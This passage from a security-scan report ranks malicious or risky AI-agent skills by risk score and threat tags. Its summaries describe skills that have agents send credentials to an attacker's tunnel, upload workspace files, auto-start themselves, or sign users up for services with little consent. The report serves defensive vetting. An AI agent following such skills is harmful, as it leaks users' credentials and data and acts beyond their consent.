> Instructs the AI agent to autonomously self-register on a third-party cloud service (Subfeed), create AI entities, and then onboard the human user by collecting their email and creating an account on their behalf — all with minimal upfront user conse...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/subfeed)

---

### 55. 🚨 amazon-to-shopify-sync by walynlee

**Risk:** 93% █████████░ | **Downloads:** 289

> 声称是一个将亚马逊商品数据同步到Shopify的通用引擎，但实际代码是针对特定商品(ASIN B0FHPZRLJK)的硬编码脚本，包含明文API密钥，且核心同步逻辑无法正常运行。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/amazon-to-shopify-sync)

---

### 56. 🚨 feishu-group-ops by vinzeny

**Risk:** 80% ████████░░ | **Downloads:** 169

> A Feishu (Lark) group management skill for the OpenClaw platform that allows natural language management of group chats (add/remove members, list groups, send messages, rename/create groups) via a Python CLI script, with per-write-operation billing t...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/feishu-group-ops)

---

### 57. 🚨 Reddit VOC Lobster Pro by unknown

**Risk:** 94% █████████░ | **Downloads:** 0

> 该 skill 声称是一个 Reddit 消费者调研引擎，能自动抓取 Reddit 数据、同步至飞书多维表，并将报告发布至 Cloudflare Pages。但实际代码中的数据抓取和飞书写入均为伪造操作，且包含硬编码的真实 API 凭证。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/Reddit VOC Lobster Pro)

---

### 58. 🚨 agenttok by unknown

**Risk:** 92% █████████░ | **Downloads:** 0

> 该技能声称为AI代理提供一个名为AgentTok的TikTok式视频分享平台，自动注册账号、生成介绍视频并上传。实际上，脚本将凭证和数据发送至攻击者控制的Cloudflare临时隧道（非官方域名），并在本地以明文形式保存敏感凭证，构成凭证窃取和数据渗漏攻击。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` Environment Variable Exfiltration
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/agenttok)

---

### 59. 🚨 agentconnex-register by anshkohli88

**Risk:** 85% ████████░░ | **Downloads:** 0

> Auto-registers 'OpenClaw' agents on agentconnex.com by reading workspace files (SOUL.md, IDENTITY.md, AGENTS.md) and POSTing agent profile data to a third-party external service, with a zero-config auto-boot mechanism that installs itself to run on e...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` Environment Variable Exfiltration
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/agentconnex-register)

---

### 60. 🚨 markdown-formatter by unknown

**Risk:** 82% ████████░░ | **Downloads:** 0

> A Node.js skill claiming to format, lint, and beautify markdown documents with configurable style guides (CommonMark, GitHub Flavored Markdown, custom), but containing multiple critical runtime bugs that make core functionality non-functional.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/markdown-formatter)

---

### 61. 🚨 x-search by jaaneek

**Risk:** 82% ████████░░ | **Downloads:** 0

> Executes paid X/Twitter searches via a third-party npm package (@itzannetos/x402-tools-claude) using the x402 payment protocol, charging $0.05 USDC per query from the user's Base network wallet.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` Private Key Extraction
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/x-search)

---

### 62. 🚨 xiaoai-bridge by unknown

**Risk:** 80% ████████░░ | **Downloads:** 0

> 通过轮询小米云端 API 监听小爱音箱语音消息，过滤触发词后以 JSON 格式输出，并支持通过 TTS 向小爱音箱播报文本，实现语音指令桥接功能。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/xiaoai-bridge)

---

### 63. 🚨 stealthy-auto-browse by psyb0t

**Risk:** 78% ████████░░ | **Downloads:** 0

> A Docker-based stealth browser automation skill using Camoufox (Firefox fork) with OS-level PyAutoGUI input to bypass Cloudflare, DataDome, PerimeterX, and other bot-detection systems via an HTTP JSON API.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/stealthy-auto-browse)

---

### 64. 🚨 game-cog by nitishgargiitd

**Risk:** 78% ████████░░ | **Downloads:** 0

> A documentation-only guide skill that instructs users to install and use an external 'cellcog' service for game asset generation (sprites, tilesets, music, GDDs, 3D models). Contains no executable implementation — purely marketing copy and example pr...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/game-cog)

---

### 65. 🚨 deploy-agent by unknown

**Risk:** 78% ████████░░ | **Downloads:** 0

> A multi-step deployment workflow manager for full-stack apps targeting GitHub + Cloudflare Pages, with persistent state and human approval gates at each stage. The bash script manages deployment lifecycle via JSON state files.

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/deploy-agent)

---

### 66. 🚨 dygod-movies by anlinxi

**Risk:** 78% ████████░░ | **Downloads:** 0

> 爬取电影天堂(dygod.net)的电影/电视剧信息，展示最新更新和高分影视，并通过群晖NAS的DownloadStation下载磁力/FTP链接资源

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/dygod-movies)

---

### 67. 🚨 vibe-harvester by anotherj1

**Risk:** 78% ████████░░ | **Downloads:** 0

> 一个旨在自动化浏览瀑布流网站（如小红书、Pinterest）、通过视觉大模型筛选符合用户审美偏好的图片，并自动下载保存到本地目录的技能。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/vibe-harvester)

---

### 68. 🚨 document-parser by ankylala

**Risk:** 72% ███████░░░ | **Downloads:** 0

> 通过调用外部第三方 HTTP API（固定IP：47.111.146.164）解析 PDF、图片和 Word 文档，提取结构化数据，以命令行工具形式运行。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/document-parser)

---

### 69. 🚨 neural-memory by nhadaututtheky

**Risk:** 72% ███████░░░ | **Downloads:** 0

> A Claude Code plugin that provides persistent, associative memory for AI agents using a neural graph architecture with spreading activation recall. Includes an MCP server (45 tools), three lifecycle hooks (PreCompact/Stop/PostToolUse), and three work...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/neural-memory)

---

### 70. 🚨 ai-receptionist by antimoron

**Risk:** 72% ███████░░░ | **Downloads:** 0

> A step-by-step guided workflow that walks users through creating an account on Solvea (solvea.cx), configuring an AI agent, uploading a knowledge base, testing, and deploying via multiple channels — effectively acting as a promotional onboarding funn...

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/ai-receptionist)

---

### 71. 🚨 vdoob by unknown

**Risk:** 72% ███████░░░ | **Downloads:** 0

> 该技能将 Claude AI 接入 vdoob.com 平台，让 AI 代理自动回答用户问题以赚取虚拟货币（'饵'），包括定时任务自动拉取问题并提交答案、本地存储思维模式、以及市场/社交等附加功能。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[HIGH]` Outbound Data Transfer
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/vdoob)

---

### 72. 🚨 github-to-clawhub by antonia-sz

**Risk:** 71% ███████░░░ | **Downloads:** 0

> 将任意 GitHub 开源项目自动转化为 OpenClaw skill 并发布到 clawhub.com 的 7 步流程助手，涵盖 README 抓取、查重、SKILL.md 生成、本地目录创建和 clawhub CLI 发布。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` LLM Semantic Detection
- `[CRITICAL]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/github-to-clawhub)

---

### 73. 🚨 jd-interview-prep by antonia-sz

**Risk:** 66% ███████░░░ | **Downloads:** 0

> 接收用户粘贴或上传的岗位描述（JD）和个人简历，通过调用 LLM API（DeepSeek/OpenAI 兼容接口）生成匹配度分析、15 道分类面试题（含 STAR 框架）及备考建议，并可将报告导出为 Markdown 文件。

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` Environment Variable Exfiltration
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/jd-interview-prep)

---

### 74. 🚨 Tencent Cloud Lighthouse by unknown

**Risk:** 63% ██████░░░░ | **Downloads:** 0

> 通过 mcporter + lighthouse-mcp-server 管理腾讯云轻量应用服务器，提供自动化安装配置、实例管理、监控告警、防火墙管理和远程命令执行功能

**Threats detected:**
- `[HIGH]` Dynamic Code Evaluation
- `[CRITICAL]` Environment Variable Exfiltration
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection
- `[HIGH]` LLM Semantic Detection

[Full report →](https://clawsec.cc/skill/Tencent Cloud Lighthouse)

---

## Most Common Threat Types

| Threat | Count |
|--------|-------|
| LLM Semantic Detection | 636 |
| Startup Failure (non-executable) | 73 |
| Dynamic Code Evaluation | 68 |
| Outbound Data Transfer | 29 |
| Hidden Command Execution | 14 |
| Private Key Extraction | 8 |
| Environment Variable Exfiltration | 7 |
| Base64 Encoded Payload | 3 |
| Remote Script Execution | 3 |
| SSH Key Access | 2 |

---
*[ClawSec](https://clawsec.cc) | [ClawSearch](https://clawsearch.cc) | `npx clawsearch-guard <skill>`*